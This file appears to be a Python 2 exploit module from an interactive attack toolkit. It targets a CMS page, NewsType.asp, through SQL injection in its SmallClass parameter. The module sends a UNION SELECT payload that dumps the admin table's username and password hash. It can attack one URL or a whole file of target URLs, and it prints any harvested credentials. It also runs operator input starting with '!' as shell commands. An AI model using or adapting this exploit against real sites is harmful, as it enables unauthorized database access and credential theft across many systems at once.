# encoding:utf8
import requests
import re
import os
from core import help
from core.req import headers
from comm import *

options = ["http://www.baidu.com",""]

def sql_exp():

    ksf_1 = ksf_line("cms","nf_newstype_sqli")
    com = raw_input(ksf_1)
 
    try:
        if com[0:7] == 'set url':
            url = com[8:]
            options[0] = url
            print tag_true + "url => " + options[0]
            sql_exp()
        elif com[0:9] == 'set files': 
            files = com[10:]
            options[1] = files
            print tag_true + "files => " + options[1]
        elif com[0:12] == 'show options':
            show_op()
            print "URL\t\t" + options[0] + "\t\tThe target address"
            print "FILES\t\t" + options[1] + "\t\tThe target address for files"
            sql_exp()
        elif com[0:1] == '!':
            os.system(com[1:])
            sql_exp()
        elif com[0:4] == 'help':
            help.help()
            sql_exp()
        elif com[0:4] == 'back':
            pass
        elif com[0:4] == 'exit':
            exit(0)
        elif com[0:3] == 'run' or com[0:7] == 'exploit':

            payload = "NewsType.asp?SmallClass=' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin union select * from news where 1=2 and ''='"
            Headers = headers.Headers

            rer = re.compile(r'target=\\"_blank\\">(.*?)\|(.*?)</a></span>')
            if options[1]:
                try:
                    with open(options[1],'r') as f:
                        for url in f.readlines():    
                            url = url.rstrip()
                        
                            r = requests.get(url+'/'+payload, headers=Headers)
                            if "javastr" in r.content:
                                result = rer.findall(r.content)[0]
                                if result:
                                    print url
                                    print tag_true + " Found admin:{0}, passmd5:{1}".format(result[0],result[1])
                                    print "\n"
                except:pass
                sql_exp()

            else:
                try:
                    r = requests.get(options[0]+'/'+payload, headers=Headers)
                except:
                    print "[!] Some error,please check your network!"
                if "javastr" in r.content:
                    result = rer.findall(r.content)[0]
                if result:
                    print options[0]
                    print tag_treu +" Found admin:{0}, passmd5:{1}".format(result[0],result[1])
                else:
                    print tag_false +" Not Found"
               
                sql_exp()
            
            sql_exp()
        else:
            sql_exp()

    except KeyboardInterrupt:
        print_err("[*] Detected Ctrl-C ,System Exit...")